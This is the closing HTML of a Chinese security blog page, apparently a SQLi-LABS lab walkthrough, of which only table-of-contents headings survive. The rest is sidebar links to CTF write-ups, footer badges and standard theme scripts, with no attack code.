class="toc-number">1.5.7.</span> <span class="toc-text">Less-60</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-61"><span class="toc-number">1.5.8.</span> <span class="toc-text">Less-61</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-62"><span class="toc-number">1.5.9.</span> <span class="toc-text">Less-62</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5-10"><span class="toc-number">1.5.9.1.</span> <span class="toc-text">手工注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SQLMap-%E5%B7%A5%E5%85%B7%E6%B3%A8%E5%85%A5-10"><span class="toc-number">1.5.9.2.</span> <span class="toc-text">SQLMap 工具注入</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-63"><span class="toc-number">1.5.10.</span> <span class="toc-text">Less-63</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-64"><span class="toc-number">1.5.11.</span> <span class="toc-text">Less-64</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-65"><span class="toc-number">1.5.12.</span> <span class="toc-text">Less-65</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%90%8E%E8%AE%B0-4"><span class="toc-number">1.6.</span> <span class="toc-text">后记</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5-3"><span class="toc-number">1.7.</span> <span class="toc-text">参考链接</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/posts/be72b982/" title="LFI-Labs 完整训练"><img src="https://pic.h-t-m.ltd/img/LFI-Labs.webp" onerror='this.onerror=null,this.src="/img/404.jpg"' alt="LFI-Labs 完整训练"></a><div class="content"><a class="title" href="/posts/be72b982/" title="LFI-Labs 完整训练">LFI-Labs 完整训练</a><time datetime="2023-01-02T03:23:55.000Z" title="发表于 2023-01-02 11:23:55">2023-01-02</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/de7d7276/" title="BUUCTF 刷题笔记——Web 2"><img src="https://pic.h-t-m.ltd/img/BUUCTF-Web.webp" onerror='this.onerror=null,this.src="/img/404.jpg"' alt="BUUCTF 刷题笔记——Web 2"></a><div class="content"><a class="title" href="/posts/de7d7276/" title="BUUCTF 刷题笔记——Web 2">BUUCTF 刷题笔记——Web 2</a><time datetime="2022-11-08T07:39:23.000Z" title="发表于 2022-11-08 15:39:23">2022-11-08</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/72821c8/" title="BUUCTF 刷题笔记——PWN 2"><img src="https://pic.h-t-m.ltd/img/BUUCTF-PWN.webp" onerror='this.onerror=null,this.src="/img/404.jpg"' alt="BUUCTF 刷题笔记——PWN 2"></a><div class="content"><a class="title" href="/posts/72821c8/" title="BUUCTF 刷题笔记——PWN 2">BUUCTF 刷题笔记——PWN 2</a><time datetime="2022-10-24T08:18:23.000Z" title="发表于 2022-10-24 16:18:23">2022-10-24</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/8a881eff/" title="SQLi-LABS-完整训练"><img src="https://pic.h-t-m.ltd/img/SQLi-LABS.webp" onerror='this.onerror=null,this.src="/img/404.jpg"' alt="SQLi-LABS-完整训练"></a><div class="content"><a class="title" href="/posts/8a881eff/" title="SQLi-LABS-完整训练">SQLi-LABS-完整训练</a><time datetime="2022-10-24T06:10:55.000Z" title="发表于 2022-10-24 14:10:55">2022-10-24</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/aea4d4bd/" title="BUUCTF 刷题笔记——Crypto 1"><img src="https://pic.h-t-m.ltd/img/BUUCTF-Crypto.webp" onerror='this.onerror=null,this.src="/img/404.jpg"' alt="BUUCTF 刷题笔记——Crypto 1"></a><div class="content"><a class="title" href="/posts/aea4d4bd/" title="BUUCTF 刷题笔记——Crypto 1">BUUCTF 刷题笔记——Crypto 1</a><time datetime="2022-10-23T06:36:23.000Z" title="发表于 2022-10-23 14:36:23">2022-10-23</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright"><span>&copy;2020 - 2023<svg style="width:1.5em;height:1.5em" aria-hidden="true"><use xlink:href="#icon-Butterfly"></use></svg></span><span>h-t-m</span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="font-plus" type="button" title="放大字体"><i class="fas fa-plus"></i></button><button id="font-minus" type="button" title="缩小字体"><i class="fas fa-minus"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><div class="search-dialog__title" id="local-search-title">本地搜索</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"></div></div></div><hr><div id="local-search-results"></div><span class="search-close-button"><i class="fas fa-times"></i></span></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/instantpage.min.js" type="module"></script><script src="https://npm.elemecdn.com/node-snackbar/dist/snackbar.min.js"></script><script src="/js/search/local-search.js"></script><script async>var preloader={endLoading:()=>{document.body.style.overflow="auto",document.getElementById("loading-box").classList.add("loaded")},initLoading:()=>{document.body.style.overflow="",document.getElementById("loading-box").classList.remove("loaded")}};window.addEventListener("load",preloader.endLoading()),setTimeout((function(){preloader.endLoading()}),5e3)</script><div class="js-pjax"><link rel="stylesheet" href="https://npm.elemecdn.com/katex@latest/dist/katex.min.css"><script src="https://npm.elemecdn.com/katex@latest/dist/contrib/copy-tex.min.js"></script><link rel="stylesheet" href="https://npm.elemecdn.com/katex@latest/dist/contrib/copy-tex.css"><script>document.querySelectorAll("#article-container span.katex-display").forEach((a=>{btf.wrap(a,"div",{class:"katex-wrap"})}))</script><script>document.getElementsByClassName("mermaid").length&&(window.mermaidJsLoad?mermaid.init():getScript("https://npm.elemecdn.com/mermaid/dist/mermaid.min.js").then((()=>{window.mermaidJsLoad=!0,mermaid.initialize({theme:"default"}),mermaid.init()})))</script><script>(()=>{const t=document.getElementById("twikoo-count"),e=()=>{twikoo.init(Object.assign({el:"#twikoo-wrap",envId:"https://twikoo-beta-seven.vercel.app/",region:""},null))},o=()=>{twikoo.getCommentsCount({envId:"https://twikoo-beta-seven.vercel.app/",region:"",urls:[window.location.pathname],includeReply:!1}).then((function(e){t.innerText=e[0].count})).catch((function(t){console.error(t)}))},n=(n=!1)=>{"object"==typeof twikoo?(e(),n&&t&&setTimeout(o,0)):getScript("https://npm.elemecdn.com/twikoo/dist/twikoo.all.min.js").then((()=>{e(),n&&t&&setTimeout(o,0)}))};btf.loadComment(document.getElementById("twikoo-wrap"),n)})()</script></div><div class="aplayer no-destroy" data-id="6751330199" data-server="netease" data-type="playlist" data-fixed="true" data-mini="true" data-listfolded="false" data-order="random" data-preload="none" data-autoplay="false" muted></div><script async src="/js/diytitle.js"></script><script async src="//at.alicdn.com/t/font_2987331_rwt2gum52cl.js"></script><script async src="//at.alicdn.com/t/font_3365955_q52nda6gxac.js"></script><script defer id="fluttering_ribbon" mobile="true" src="https://npm.elemecdn.com/butterfly-extsrc@1/dist/canvas-fluttering-ribbon.min.js"></script><script src="https://npm.elemecdn.com/butterfly-extsrc@1/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful=!0,POWERMODE.shake=!0,POWERMODE.mobile=!1,document.body.addEventListener("input",POWERMODE)</script><script id="click-show-text" src="https://npm.elemecdn.com/butterfly-extsrc@1/dist/click-show-text.min.js" data-mobile="false" data-text="I,LOVE,YOU,太毛" data-fontsize="15px" data-random="false" async></script><link rel="stylesheet" href="https://npm.elemecdn.com/aplayer/dist/APlayer.min.css" media="print" onload='this.media="all"'><script src="https://npm.elemecdn.com/aplayer/dist/APlayer.min.js"></script><script src="/js/Meting.min.js"></script><script src="https://npm.elemecdn.com/pjax/pjax.min.js"></script><script>let pjaxSelectors=["title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"];var pjax=new Pjax({elements:'a:not([target="_blank"]):not([href="/bb/"])',selectors:pjaxSelectors,cacheBust:!1,analytics:!0,scrollRestoration:!1});document.addEventListener("pjax:send",(function(){if(window.removeEventListener("scroll",window.tocScrollFn),window.removeEventListener("scroll",scrollCollect),"object"==typeof preloader&&preloader.initLoading(),window.aplayers)for(let e=0;e<window.aplayers.length;e++)window.aplayers[e].options.fixed||window.aplayers[e].destroy();"object"==typeof typed&&typed.destroy();const e=document.body.classList;e.contains("read-mode")&&e.remove("read-mode")})),document.addEventListener("pjax:complete",(function(){window.refreshFn(),document.querySelectorAll("script[data-pjax]").forEach((e=>{const t=document.createElement("script"),o=e.text||e.textContent||e.innerHTML||"";Array.from(e.attributes).forEach((e=>t.setAttribute(e.name,e.value))),t.appendChild(document.createTextNode(o)),e.parentNode.replaceChild(t,e)})),GLOBAL_CONFIG.islazyload&&window.lazyLoadInstance.update(),"function"==typeof chatBtnFn&&chatBtnFn(),"function"==typeof panguInit&&panguInit(),"function"==typeof gtag&&gtag("config","UA-214297516-1",{page_path:window.location.pathname}),"object"==typeof _hmt&&_hmt.push(["_trackPageview",window.location.pathname]),"function"==typeof loadMeting&&document.getElementsByClassName("aplayer").length&&loadMeting(),"object"==typeof Prism&&Prism.highlightAll(),"object"==typeof preloader&&preloader.endLoading()})),document.addEventListener("pjax:error",(e=>{404===e.request.status&&pjax.loadUrl("/404.html")}))</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div class="app-refresh" id="app-refresh" style="position:fixed;top:-2.2rem;left:0;right:0;z-index:99999;padding:0 1rem;font-size:15px;height:2.2rem;transition:all .3s ease"><div class="app-refresh-wrap" style="display:flex;color:#fff;height:100%;align-items:center;justify-content:center"><label>✨ h-t-m 更新了 👉</label><a href="javascript:void(0)" onclick="location.reload()"><span style="color:#fff;text-decoration:underline;cursor:pointer">👨‍💻立即刷新👌</span></a></div></div><script>function showNotification(){if(GLOBAL_CONFIG.Snackbar){var t="light"===document.documentElement.getAttribute("data-theme")?GLOBAL_CONFIG.Snackbar.bgLight:GLOBAL_CONFIG.Snackbar.bgDark,e=GLOBAL_CONFIG.Snackbar.position;Snackbar.show({text:"✨ h-t-m 更新了 👉",backgroundColor:t,duration:5e5,pos:e,actionText:"👨‍💻立即刷新👌",actionTextColor:"#fff",onActionClick:function(t){location.reload()}})}else{var o=`top: 0; background: ${"light"===document.documentElement.getAttribute("data-theme")?"#49b1f5":"#1f1f1f"};`;document.getElementById("app-refresh").style.cssText=o}}"serviceWorker"in navigator&&(navigator.serviceWorker.controller&&navigator.serviceWorker.addEventListener("controllerchange",(function(){showNotification()})),window.addEventListener("load",(function(){navigator.serviceWorker.register("/sw.js")})))</script></div><script>var fdata={apiurl:"https://fcircle-h-t-m.vercel.app/api",initnumber:20,stepnumber:10,error_img:"https://cdn.jsdelivr.net/npm/akilar-candyassets/image/404.gif"};localStorage.setItem("fdatalist",JSON.stringify(fdata))</script><script defer src="https://cdn.jsdelivr.net/npm/hexo-filter-fcircle/assets/js/fetch.min.js"></script><script data-pjax>function butterfly_clock_injector_config(){var l=document.getElementsByClassName("sticky_layout")[0];console.log("已挂载butterfly_clock"),l.insertAdjacentHTML("afterbegin",'<div class="card-widget card-clock"><div class="card-glass"><div class="card-background"><div class="card-content"><div id="hexo_electric_clock"><img class="entered loading" id="card-clock-loading" src="/images/~logo.gif" style="height: 120px; width: 100%;" data-ll-status="loading"/></div></div></div></div></div>')}for(var elist="null".split(","),cpage=location.pathname,epage="all",flag=0,i=0;i<elist.length;i++)cpage.includes(elist[i])&&flag++;("all"===epage&&0==flag||epage===cpage)&&butterfly_clock_injector_config()</script><script src="https://pv.sohu.com/cityjson?ie=utf-8"></script><script data-pjax src="https://npm.elemecdn.com/hexo-butterfly-clock/lib/clock.min.js"></script><script data-pjax>function butterfly_footer_beautify_injector_config(){var t=document.getElementById("footer-wrap");console.log("已挂载butterfly_footer_beautify"),t.insertAdjacentHTML("beforeend",'<div id="workboard"></div><p id="ghbdages"><a class="github-badge" target="_blank" href="https://hexo.io/" style="margin-inline:5px" data-title="博客框架为Hexo_v5.4.0" title=""><img src="https://pic.h-t-m.ltd/img/Frame-Hexo.svg" alt=""/></a><a class="github-badge" target="_blank" href="https://butterfly.js.org/" style="margin-inline:5px" data-title="主题版本Butterfly_v3.8.2" title=""><img src="https://pic.h-t-m.ltd/img/Theme-Butterfly.svg" alt=""/></a><a class="github-badge" target="_blank" href="https://vercel.com/" style="margin-inline:5px" data-title="本站默认线路托管于Vercel" title=""><img src="https://pic.h-t-m.ltd/img/Hosted-Vercel.svg" alt=""/></a><a class="github-badge" target="_blank" href="https://github.com/" style="margin-inline:5px" data-title="本站项目由Gtihub托管" title=""><img src="https://pic.h-t-m.ltd/img/Source-Github.svg" alt=""/></a><a class="github-badge" target="_blank" href="https://www.upyun.com/?utm_source=lianmeng&amp;utm_medium=referral" style="margin-inline:5px" data-title="本网站由又拍云提供 CDN 加速 / 云储存服务" title=""><img src="https://pic.h-t-m.ltd/img/upyun.svg" alt=""/></a><a class="github-badge" target="_blank" href="http://www.beian.gov.cn/portal/registerSystemInfo?recordcode=42011502001415" style="margin-inline:5px" data-title="本站已完成公安备案，备案号鄂公网安备 42011502001415号" title=""><img src="https://pic.h-t-m.ltd/img/police-beian.svg" alt=""/></a><a class="github-badge" target="_blank" href="https://beian.miit.gov.cn/#/Integrated/index" style="margin-inline:5px" data-title="本站已在工信部备案，备案号赣ICP备2021010131号-2" title=""><img src="https://pic.h-t-m.ltd/img/beian.svg" alt=""/></a><a class="github-badge" target="_blank" href="https://icp.gov.moe/?keyword=20220223" style="margin-inline:5px" data-title="本站已在萌国备案，备案号萌ICP备20220223号" title=""><img src="https://pic.h-t-m.ltd/img/moe-beian.svg" alt=""/></a></p>')}for(var elist="null".split(","),cpage=location.pathname,epage="all",flag=0,i=0;i<elist.length;i++)cpage.includes(elist[i])&&flag++;("all"===epage&&0==flag||epage===cpage)&&butterfly_footer_beautify_injector_config()</script><script async src="/js/runtime.js"></script><script async src="//at.alicdn.com/t/font_3365955_q52nda6gxac.js"></script></body></html>